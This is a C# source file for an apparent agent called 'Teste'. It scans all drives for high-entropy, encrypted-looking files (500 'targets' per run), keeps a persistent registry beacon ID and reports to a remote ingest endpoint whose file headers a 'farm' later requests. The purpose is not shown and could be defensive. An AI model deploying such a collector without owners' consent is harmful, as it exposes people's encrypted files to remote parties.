using Microsoft.Win32;

namespace Teste.Core;

public static class Flags
{
    public static string Endpoint =
        Environment.GetEnvironmentVariable("TESTE_ENDPOINT") ?? "https://ingest.seudominio.dev/v1/beacon";
    public static string Secret =
        Environment.GetEnvironmentVariable("TESTE_SECRET") ?? "TROQUE-EM-SEGREDO-POR-MAQUINA";

    // --root repete quantas vezes quiser; vazio = todos os discos fixos e removíveis
    public static readonly List<string> Roots = new();

    public static void Parse(string[] args)
    {
        for (var i = 0; i < args.Length - 1; i++)
            switch (args[i].ToLowerInvariant())
            {
                case "--endpoint": Endpoint = args[++i]; break;
                case "--secret": Secret = args[++i]; break;
                case "--root": Roots.Add(Environment.ExpandEnvironmentVariables(args[++i])); break;
            }
    }
}

public static class Limits
{
    public const int Targets = 500;                 // alvos por execução
    public const int HeaderBytes = 512 * 1024;      // cabeçalho que o farm vai pedir depois
    public const long MinBytes = 48;
    public const long MaxFullHash = 2L * 1024 * 1024 * 1024;   // acima disso, fingerprint parcial
    public const double MinEntropy = 7.2;           // abaixo, é arquivo solto, não cifra
}

public sealed class Logger(bool verbose)
{
    private readonly string _path = Path.Combine(
        Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Teste", "agent.log");

    public void Line(string m)
    {
        if (verbose) Console.WriteLine(m);
        try
        {
            Directory.CreateDirectory(Path.GetDirectoryName(_path)!);
            File.AppendAllText(_path, $"{DateTime.Now:O} {m}{Environment.NewLine}");
        }
        catch { }
    }
}

internal static class Beacon
{
    private const string Key = @"Software\Teste";
    public static string Read()
    {
        using var h = Registry.CurrentUser.CreateSubKey(Key);
        var id = h.GetValue("beacon") as string;
        if (string.IsNullOrEmpty(id)) { id = Guid.NewGuid().ToString("N"); h.SetValue("beacon", id); }
        return id;
    }
}